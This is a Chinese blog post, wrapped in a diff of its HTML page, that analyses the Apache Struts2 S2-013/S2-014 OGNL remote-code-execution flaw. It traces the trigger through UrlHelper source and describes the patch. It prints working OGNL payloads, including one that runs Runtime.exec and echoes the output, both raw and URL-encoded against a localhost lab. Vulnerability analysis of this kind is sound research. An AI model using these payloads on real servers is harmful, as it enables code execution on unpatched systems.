@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          【Struts2-命令-代码执行漏洞分析系列】 S2-013 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/09/Struts2-命令-代码执行漏洞分析系列-S2-013/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#struts2" title="struts2">struts2</a>
+                        
+                    </div>
+                    <h1>【Struts2-命令-代码执行漏洞分析系列】 S2-013</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-09-02
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>S2-014是对于S2-013修复不完整的造成的漏洞，会在<strong>漏洞分析</strong>中提到，所以文本的主要分析的还是S2-013</p>
+<p>而且在分析的时候，发现参考网上资料时对于漏洞触发逻辑的一些错误  至少目前我自己是那么认为的：） </p>
+<p>漏洞环境根据vulhub修改而来，环境地址 <a href="https://github.com/kingkaki/Struts2-Vulenv，感兴趣的师傅可以一起分析下" target="_blank" rel="noopener">https://github.com/kingkaki/Struts2-Vulenv，感兴趣的师傅可以一起分析下</a></p>
+<p>若有疏漏，还望多多指教</p>
+<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-013" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-013</a></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/1.png" alt></p>
+<blockquote>
+<p>Both the <em>s:url</em> and <em>s:a</em> tag provide an <em>includeParams</em> attribute.</p>
+<p>The main scope of that attribute is to understand whether includes http request parameter or not.</p>
+<p>The allowed values of includeParams are:</p>
+<ol>
+<li><em>none</em> - include no parameters in the URL (default)</li>
+<li><em>get</em> - include only GET parameters in the URL</li>
+<li><em>all</em> - include both GET and POST parameters in the URL</li>
+</ol>
+<p>A request that included a specially crafted request parameter could be used to inject arbitrary OGNL code into the stack, afterward used as request parameter of an <em>URL</em> or <em>A</em> tag , which will cause a further evaluation.</p>
+<p>The second evaluation happens when the URL/A tag tries to resolve every parameters present in the original request.<br>This lets malicious users put arbitrary OGNL statements into any request parameter (not necessarily managed by the code) and have it evaluated as an OGNL expression to enable method execution and execute arbitrary methods, bypassing Struts and OGNL library protections.</p>
+</blockquote>
+<p>struts2的标签中 <code>&lt;s:a&gt;</code> 和 <code>&lt;s:url&gt;</code> 都有一个 includeParams 属性，可以设置成如下值</p>
+<ol>
+<li><em>none</em> - URL中<em>不</em>包含任何参数（默认）</li>
+<li><em>get</em> - 仅包含URL中的GET参数</li>
+<li><em>all</em> - 在URL中包含GET和POST参数</li>
+</ol>
+<p>当<code>includeParams=all</code>的时候，会将本次请求的GET和POST参数都放在URL的GET参数上。</p>
+<p>此时<code>&lt;s:a&gt;</code> 或<code>&lt;s:url&gt;</code>尝试去解析原始请求参数时，会导致OGNL表达式的执行</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>不妨先来看下index.jsp中标签是怎么设置的</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;s:a id="link1" action="link" includeParams="all"&gt;"s:a" tag&lt;/s:a&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;s:url id="link2" action="link" includeParams="all"&gt;"s:url" tag&lt;/s:url&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+<p>然后来测试一下最简单payload <code>${1+1}</code>（记得编码提交 ：）</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">8888</span>/link.action?a=<span class="symbol">%</span><span class="number">24</span><span class="symbol">%</span><span class="number">7B1</span><span class="symbol">%</span><span class="number">2b1</span>%7D</span><br></pre></td></tr></table></figure>
+<p>就可以看到返回的url中的参数已经被解析成了2</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/2.png" alt></p>
+<p>然后命令执行的payload</p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$&#123;</span><span class="symbol">#_memberAccess</span>[<span class="comment">"allowStaticMethodAccess"</span>]=<span class="keyword">true</span>,<span class="symbol">#a</span>=@java.lang.<span class="type">Runtime</span>@getRuntime().exec(<span class="string">'calc'</span>).getInputStream(),<span class="symbol">#b</span>=new java.io.<span class="type">InputStreamReader</span>(<span class="symbol">#a</span>),<span class="symbol">#c</span>=new java.io.<span class="type">BufferedReader</span>(<span class="symbol">#b</span>),<span class="symbol">#d</span>=new char[<span class="number">50000</span>],<span class="symbol">#c</span>.read(<span class="symbol">#d</span>),<span class="symbol">#out</span>=@org.apache.struts2.<span class="type">ServletActionContext</span>@getResponse().getWriter(),<span class="symbol">#out</span>.println(+new java.lang.<span class="type">String</span>(<span class="symbol">#d</span>)),<span class="symbol">#out</span>.close()&#125;</span><br></pre></td></tr></table></figure>
+<p>编码后提交</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:<span class="number">8888</span>/link.action?a=<span class="symbol">%24</span><span class="symbol">%7</span>B<span class="symbol">%23</span>_memberAccess<span class="symbol">%5</span>B<span class="symbol">%22</span>allowStaticMethodAccess<span class="symbol">%22</span><span class="symbol">%5</span>D<span class="symbol">%3</span>Dtrue<span class="symbol">%2</span>C<span class="symbol">%23</span>a<span class="symbol">%3</span>D<span class="title">@java.lang.Runtime</span><span class="title">@getRuntime</span><span class="symbol">%28</span><span class="symbol">%29</span>.exec<span class="symbol">%28</span><span class="symbol">%27</span>calc<span class="symbol">%27</span><span class="symbol">%29</span>.getInputStream<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%2</span>C<span class="symbol">%23</span>b<span class="symbol">%3</span>Dnew<span class="symbol">%20</span>java.io.InputStreamReader<span class="symbol">%28</span><span class="symbol">%23</span>a<span class="symbol">%29</span><span class="symbol">%2</span>C<span class="symbol">%23</span><span class="keyword">c</span><span class="symbol">%3</span>Dnew<span class="symbol">%20</span>java.io.BufferedReader<span class="symbol">%28</span><span class="symbol">%23</span>b<span class="symbol">%29</span><span class="symbol">%2</span>C<span class="symbol">%23</span>d<span class="symbol">%3</span>Dnew<span class="symbol">%20</span>char<span class="symbol">%5</span>B<span class="number">50000</span><span class="symbol">%5</span>D<span class="symbol">%2</span>C<span class="symbol">%23</span><span class="keyword">c</span>.read<span class="symbol">%28</span><span class="symbol">%23</span>d<span class="symbol">%29</span><span class="symbol">%2</span>C<span class="symbol">%23</span>out<span class="symbol">%3</span>D<span class="title">@org.apache.struts2.ServletActionContext</span><span class="title">@getResponse</span><span class="symbol">%28</span><span class="symbol">%29</span>.getWriter<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%2</span>C<span class="symbol">%23</span>out.println<span class="symbol">%28</span><span class="symbol">%2</span>bnew<span class="symbol">%20</span>java.lang.String<span class="symbol">%28</span><span class="symbol">%23</span>d<span class="symbol">%29</span><span class="symbol">%29</span><span class="symbol">%2</span>C<span class="symbol">%23</span>out.close<span class="symbol">%28</span><span class="symbol">%29</span><span class="symbol">%7</span>D</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/3.png" alt></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>网上关于S2-013的分析将它的形成归结于</p>
+<blockquote>
+<p> org.apache.struts2.views.uti.DefaultUrlHelper这个class的parseQueryString方法</p>
+<p>在<code>String translatedParamValue = translateAndDecode(paramValue);</code>的时候解析了ONGL从而造成的代码执行</p>
+</blockquote>
+<p>这里我先说明两点 </p>
+<ul>
+<li>我分析时的漏洞环境种<code>xwork-core</code>的版本是2.2.3，<code>DefaultUrlHelper.class</code>中的类全部在<code>UrlHelper.class</code>，但是代码逻辑并没有更改</li>
+<li>至于漏洞究竟是哪里触发的，可以根据弹出计算器在哪弹出来确定究竟是哪里触发的</li>
+</ul>
+<p>我们可以从一开始的<code>struts2-core-2.2.3.jar!/org/apache/struts2/components/Anchor.class:64</code>中这两句开始关注</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.urlRenderer.beforeRenderUrl(<span class="keyword">this</span>.urlProvider);</span><br><span class="line"><span class="keyword">this</span>.urlRenderer.renderUrl(sw, <span class="keyword">this</span>.urlProvider);</span><br></pre></td></tr></table></figure>
+<p>第一句是返回url之前的一些处理，第二句是返回url，从第一句开始打下断点，然后跟进去</p>
+<p>果然还是来到了<code>struts2-core-2.2.3.jar!/org/apache/struts2/views/util/UrlHelper.class:240</code>的<code>parseQueryString</code>方法</p>
+<p>但是可以看到，即使过了网上说的这个触发点，计算器依旧没有弹出</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">String translatedParamValue</span> = translateAndDecode(paramValue);</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/4.png" alt></p>
+<p>仅仅是做了一个url编码的过程，然后就返回了，那就继续跟下去吧</p>
+<p>最后做完了url的一些预先处理，又回到了之前下断点的下一句</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/5.png" alt></p>
+<p>step into进去之后来到了<code>struts2-core-2.2.3.jar!/org/apache/struts2/components/ServletUrlRenderer.class:39</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">renderUrl</span><span class="params">(Writer writer, UrlProvider urlComponent)</span> </span>&#123;</span><br><span class="line">    String scheme = urlComponent.getHttpServletRequest().getScheme();</span><br><span class="line">    <span class="keyword">if</span> (urlComponent.getScheme() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        scheme = urlComponent.getScheme();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ActionInvocation ai = (ActionInvocation)ActionContext.getContext().get(<span class="string">"com.opensymphony.xwork2.ActionContext.actionInvocation"</span>);</span><br><span class="line">    String result;</span><br><span class="line">    String _value;</span><br><span class="line">    String <span class="keyword">var</span>;</span><br><span class="line">    <span class="keyword">if</span> (urlComponent.getValue() == <span class="keyword">null</span> &amp;&amp; urlComponent.getAction() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        result = urlComponent.determineActionURL(urlComponent.getAction(), urlComponent.getNamespace(), urlComponent.getMethod(), urlComponent.getHttpServletRequest(), urlComponent.getHttpServletResponse(), urlComponent.getParameters(), scheme, urlComponent.isIncludeContext(), urlComponent.isEncode(), urlComponent.isForceAddSchemeHostAndPort(), urlComponent.isEscapeAmp());</span><br><span class="line">    &#125; <span class="keyword">else</span>  ...</span><br></pre></td></tr></table></figure>
+<p>真正触发漏洞在这一个语句里面，不妨跟进去看一下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/6.png" alt></p>
+<p>来到了<code>struts2-core-2.2.3.jar!/org/apache/struts2/components/Component.class:198</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/7.png" alt></p>
+<p>继续跟进最后一行的那个函数</p>
+<p>来到了<code>struts2-core-2.2.3.jar!/org/apache/struts2/views/util/UrlHelper.class:49</code>的<code>buildUrl</code>函数中</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/8.png" alt></p>
+<p>前面做了一些url的处理，添加一些<code>http(s)://</code>之类的前缀，来到后面之后，116行有这样一句</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (escapeAmp) &#123;</span><br><span class="line">    buildParametersString(params, link);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里才是真正的开始build参数</p>
+<p>继续step into之后<code>struts2-core-2.2.3.jar!/org/apache/struts2/views/util/UrlHelper.class:139</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">buildParametersString</span><span class="params">(Map params, StringBuilder link, String paramSeparator)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (params != <span class="keyword">null</span> &amp;&amp; params.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (link.toString().indexOf(<span class="string">"?"</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">                link.append(<span class="string">"?"</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                link.append(paramSeparator);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Iterator iter = params.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(iter.hasNext()) &#123;</span><br><span class="line">                Entry entry = (Entry)iter.next();</span><br><span class="line">                String name = (String)entry.getKey();</span><br><span class="line">                Object value = entry.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Iterable) &#123;</span><br><span class="line">                    Iterator iterator = ((Iterable)value).iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(iterator.hasNext()) &#123;</span><br><span class="line">                        Object paramValue = iterator.next();</span><br><span class="line">                        link.append(buildParameterSubstring(name, paramValue.toString()));</span><br><span class="line">                        <span class="keyword">if</span> (iterator.hasNext()) &#123;</span><br><span class="line">                            link.append(paramSeparator);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value <span class="keyword">instanceof</span> Object[]) &#123;</span><br><span class="line">                    Object[] array = (Object[])((Object[])value);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; ++i) &#123;</span><br><span class="line">                        Object paramValue = array[i];</span><br><span class="line">                        link.append(buildParameterSubstring(name, paramValue.toString()));</span><br><span class="line">                        .....</span><br></pre></td></tr></table></figure>
+<p>取出参数值之后放入了一个数组中，再经过了<code>buildParameterSubstring</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/9.png" alt></p>
+<p><code>buildParameterSubstring</code>方法就在这段代码后面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">buildParameterSubstring</span><span class="params">(String name, String value)</span> </span>&#123;</span><br><span class="line">    StringBuilder builder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">    builder.append(translateAndEncode(name));</span><br><span class="line">    builder.append(<span class="string">'='</span>);</span><br><span class="line">    builder.append(translateAndEncode(value));</span><br><span class="line">    <span class="keyword">return</span> builder.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也就是这里，这时url解码之后的<strong><code>translateAndEncode(value)</code></strong>才真正的造成了代码的执行，才弹出了计算器</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/10.png" alt></p>
+<p>补一段<code>translateAndEncode</code>和<code>translateVariable</code>的代码，其实就刚才逻辑分析的下面</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">translateAndDecode</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    String translatedInput = translateVariable(input);</span><br><span class="line">    String encoding = getEncodingFromConfiguration();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> URLDecoder.decode(translatedInput, encoding);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var4) &#123;</span><br><span class="line">        LOG.warn(<span class="string">"Could not encode URL parameter '"</span> + input + <span class="string">"', returning value un-encoded"</span>, <span class="keyword">new</span> String[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> translatedInput;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">translateVariable</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    ValueStack valueStack = ServletActionContext.getContext().getValueStack();</span><br><span class="line">    String output = TextParseUtil.translateVariables(input, valueStack);</span><br><span class="line">    <span class="keyword">return</span> output;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>在S2-013中用于验证的poc为</p>
+<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(<span class="symbol">#_memberAccess</span>[<span class="string">'allowStaticMethodAccess'</span>]=<span class="keyword">true</span>)(<span class="symbol">#context</span>[<span class="string">'xwork.MethodAccessor.denyMethodExecution'</span>]=<span class="keyword">false</span>)(<span class="symbol">#writer</span>=@org.apache.struts2.<span class="type">ServletActionContext</span>@getResponse().getWriter(),<span class="symbol">#writer</span>.println(<span class="string">'hacked'</span>),<span class="symbol">#writer</span>.close())&#125;</span><br></pre></td></tr></table></figure>
+<p>于是官方就限制了<code>%{(#exp)}</code>格式的OGNL执行，从而造成了S2-014</p>
+<p>因为还有<code>%{exp}</code>形式的漏洞，让我们一起看下最终的修补方案</p>
+<p>重点自然是放在了<code>DefauiltUrlHlper.class</code>中</p>
+<p>将之前的<code>translateAndEncode</code>更改成了<code>encode</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">encode</span><span class="params">(String input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> URLEncoder.encode(input, <span class="keyword">this</span>.encoding);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (UnsupportedEncodingException var3) &#123;</span><br><span class="line">        <span class="keyword">if</span> (LOG.isWarnEnabled()) &#123;</span><br><span class="line">            LOG.warn(<span class="string">"Could not encode URL parameter '#0', returning value un-encoded"</span>, <span class="keyword">new</span> String[]&#123;input&#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只支持简单的url解码</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/11.png" alt></p>
+<p>之前触发的点也将函数换成了decode</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/12.png" alt></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Struts2-命令-代码执行漏洞分析系列-S2-013/13.png" alt></p>
+<h1 id="Reference-Links"><a href="#Reference-Links" class="headerlink" title="Reference Links"></a>Reference Links</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-013" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/struts2/s2-013</a></p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-013" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-013</a></p>
+<p><a href="https://cwiki.apache.org/confluence/display/WW/S2-014" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-014</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/09/weblogic漏洞练习/" data-toggle="tooltip" data-placement="top" title="weblogic漏洞练习">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/09/Struts2-命令-代码执行漏洞分析系列-S2-012/" data-toggle="tooltip" data-placement="top" title="【Struts2-命令-代码执行漏洞分析系列】S2-012">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#漏洞分析" title="漏洞分析">漏洞分析</a>
+                        
+                          <a class="tag" href="/tags/#struts2" title="struts2">struts2</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic&#39;s Blog</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
